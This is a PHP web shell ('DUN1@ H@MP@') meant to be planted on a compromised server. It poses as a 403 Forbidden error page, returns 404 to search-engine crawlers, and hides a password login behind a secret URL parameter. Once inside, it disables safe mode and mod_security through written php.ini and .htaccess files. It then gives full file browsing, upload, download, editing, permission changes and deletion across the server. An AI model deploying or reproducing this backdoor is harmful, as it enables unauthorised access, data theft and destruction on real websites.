
<?php
session_start();
error_reporting(0);
set_time_limit(0);
@clearstatcache();
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);
$auth_pass = "055b22b561dbfbf41004cff4f439bf36"; // pass : Triyel
$errorforbidden = $_SERVER['REQUEST_URI'];
$color = "#00ff00";
$default_action = 'FilesMan';
$default_use_ajax = true;
$default_charset = 'UTF-8';
if(!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}
 
function login_shell() {
?>
<?php
$errorforbidden = $_SERVER['REQUEST_URI'];
?>
<html><head>
<title>403 Forbidden (hahahahha)</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access <?php print $errorforbidden; ?>
 on this server.</p>
<p>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p>
</body></html>
<?php
if($_GET['030404'] == 'login')
{
echo '<br><br><br><br><br><center><form method="post"><input type="password" name="pass"><button>Hai Sir</button></form></center>';
}
?>
<?php
exit;
}
if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
    if( empty($auth_pass) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass) ) )
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
    else
        login_shell();
if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')) {
    @ob_clean();
    $file = $_GET['file'];
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($file).'"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($file));
    readfile($file);
    exit;
}
?>
<?php
if (file_exists("php.ini")){
}else{
$img = fopen('php.ini', 'w');
$sec = "safe_mode = OFF
disable_funtions = NONE";
fwrite($img ,$sec);
fclose($img);}
if (file_exists(".htaccess")){
}else{
$img2 = fopen('.htaccess', 'w');
$sec2 = "<IfModule mod_security.c>
                SecFilterEngine Off
                SecFilterScanPOST Off
                </IfModule>";
fwrite($img2 ,$sec2);
fclose($img2);}
$inids = @ini_get("disable_functions");
$liatds = (!empty($ds)) ? "<font color='purple'>$inids</font>" : "<font color='white'>Aman cuk :v</font></b>";
if(get_magic_quotes_gpc()){
foreach($_POST as $key=>$value){
$_POST[$key] = stripslashes($value);
}
}
echo '<!DOCTYPE HTML>
<html>
<head>
<body bgcolor="black">
<link href="" rel="stylesheet" type="text/json_decode">
<title>DUN1@ H@MP@</title>
<style>
body{
background-colour: green;

}
#content tr:hover{
background-color: blue;
text-shadow:0px 0px 12px #fff;
}
#content .first{
background-colour: red;
}
table{
border: 2px #15d6c8 dotted;
}
a{
color:green;
text-decoration: iceland;
}
a:hover{
color:blue;
text-shadow:0px 0px 10px #ffffff;
}
input,select,textarea{
border: 1px #c13e1c solid;
-moz-border-radius: 5px;
-webkit-border-radius:5px;
border-radius:5px;
}
</style>
</head>
<body>
     <center><br><br>
    	<img border="0" src="https://i.ibb.co/yQNq4FS/mahdi-rezaei-hkmfplzlsrq-unsplash-resized.jpg" width="250" height="">
      
</center>
    <h3><font  color="red"  DUN1@ H@MP@</h3></fon>
   <center><font size="6"> <div  class="greetings">
        * DUN1@ H@MP@ *
    <br></font>
<table width="770" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td><font color="white">Path :</font> ';
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);

foreach($paths as $id=>$pat){
if($pat == '' && $id == 0){
$a = true;
echo '<a href="?path=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?path=';
for($i=0;$i<=$id;$i++){
echo "$paths[$i]";
if($i != $id) echo "/";
}
echo '">'.$pat.'</a>/';
}
echo '</td></tr><tr><td>';
if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
echo '<font color="blue">BERHASIL MEUPLOAD ANJINK</font><br />';
}else{
echo '<font color="red">MAMPUS LU ANJINK GAGAL UPLOAD</font><br/>';
}
}
echo '<form enctype="multipart/form-data" method="POST">
<font color="white">FILE UPLOAD :</font> <input type="file" name="file" />
<input type="submit" value="UPLOAD" />
</form>
</td></tr>';
if(isset($_GET['filesrc'])){
echo "<tr><td>Current File : ";
echo $_GET['filesrc'];
echo '</tr></td></table><br />';
echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');
}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
if($_POST['opt'] == 'chmod'){
if(isset($_POST['perm'])){
if(chmod($_POST['path'],$_POST['perm'])){
echo '<font color="#b8cdea">BERHASIL PERMISSION  </font><br/>';
}else{
echo '<font color="#788fae">MAMPUS LU GAGAL PERMISSION </font><br />';
}
}
echo '<form method="POST">
Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="chmod">
<input type="submit" value="Enter" />
</form>';
}elseif($_POST['opt'] == 'ganti nama'){
if(isset($_POST['newname'])){
if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
echo '<font color="">SUKSES MENGGANTI NAMA</font><br/>';
}else{
echo '<font color="red">GAGAL MENGGANTI NAMA</font><br />';
}
$_POST['name'] = $_POST['newname'];
}
echo '<form method="POST">
New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="rename">
<input type="submit" value="Go" />
</form>';
}elseif($_POST['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo '<font color="green">BERHASIL MENGGEDIT </font><br/>';
}else{
echo '<font color="red">MAMPUS LU GAGAL MENGGEDIT</font><br/>';
}
fclose($fp);
}
echo '<form method="POST">
<textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="edit">
<input type="submit" value="Save" />
</form>';
}
echo '</center>';
}else{
echo '</table><br/><center>';
if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo '<font color="green">DIRECTORY BERHASIL DI HAPUS</font><br/>';
}else{
echo '<font color="red">MAMPUS LU DIRECTORY GAGAL TERHAPUS                                                                                                                                                                                                                                                                                            </font><br/>';
}
}elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){
echo '<font color="green">FILE BERHASIL DI HAPUS</font><br/>';
}else{
echo '<font color="red">MAMPUS LU GAGAL MENGHAPUS FILE</font><br/>';
}
}
}
echo '</center>';
$scandir = scandir($path);
echo '<div id="content"><table width="800" border="0" cellpadding="3" cellspacing="1" align="center">
<tr class="first">
<td><center>[NAMA]</TP></center></td>
<td><center>[UKURAN]</TP></center></td>
<td><center>[PERMISION]</peller></center></td>
<td><center>[MEMODIFIKASI]</TP></center></td>
</tr>';

foreach($scandir as $dir){
if(!is_dir($path.'/'.$dir) || $dir == '.' || $dir == '..') continue;
echo '<tr>
<td><a href="?path='.$path.'/'.$dir.'">'.$dir.'</a></td>
<td><center>--</center></td>
<td><center>';
if(is_writable($path.'/'.$dir)) echo '<font color="green">';
elseif(!is_readable($path.'/'.$dir)) echo '<font color="red">';
echo perms($path.'/'.$dir);
if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir)) echo '</font>';

echo '</center></td>
<td><center><form method="POST" action="?option&path='.$path.'">
<select name="opt">
<option value="">PILIH MENUNYA NJINK</option>
<option value="delete">DELETE </option>
<option value="chmod">CHOMD</option>
<option value="rename">EDIT NAMA</option>
</select>
<input type="hidden" name="type" value="dir">
<input type="hidden" name="name" value="'.$dir.'">
<input type="hidden" name="path" value="'.$path.'/'.$dir.'">
<input type="submit" value=">">
</form></center></td>
</tr>';
}
echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
foreach($scandir as $file){
if(!is_file($path.'/'.$file)) continue;
$size = filesize($path.'/'.$file)/1024;
$size = round($size,3);
if($size >= 1024){
$size = round($size/1024,2).' MB';
}else{
$size = $size.' KB';
}

echo '<tr>
<td><a href="?filesrc='.$path.'/'.$file.'&path='.$path.'">'.$file.'</a></td>
<td><center>'.$size.'</center></td>
<td><center>';
if(is_writable($path.'/'.$file)) echo '<font color="green">';
elseif(!is_readable($path.'/'.$file)) echo '<font color="red">';
echo perms($path.'/'.$file);
if(is_writable($path.'/'.$file) || !is_readable($path.'/'.$file)) echo '</font>';
echo '</center></td>
<td><center><form method="POST" action="?option&path='.$path.'">
<select name="opt">
<option value="">PILIH MENU</option>
<option value="delete">DELETE</ption>
<option value="chmod">CHMOD</option>
<option value="rename">GANTI NAMA</option>
<option value="edit">EDIT</option>
</select>
<input type="hidden" name="type" value="file">
<input type="hidden" name="name" value="'.$file.'">
<input type="hidden" name="path" value="'.$path.'/'.$file.'">
<input type="submit" value=">">
</form></center></td>
</tr>';
}
echo '</table>
</div>';
}
echo '<center><br/><size="6">DUN1@ H@MP@</center>
</body>
</html>';
function perms($file){
$perms = fileperms($file);

if (($perms & 0xC000) == 0xC000) {
// Socket
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
// Symbolic Link
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
// Regular
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
// Block special
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
// Directory
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
// Character special
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
// FIFO pipe
$info = 'p';
} else {
// Unknown
$info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));

return $info;
}
?>
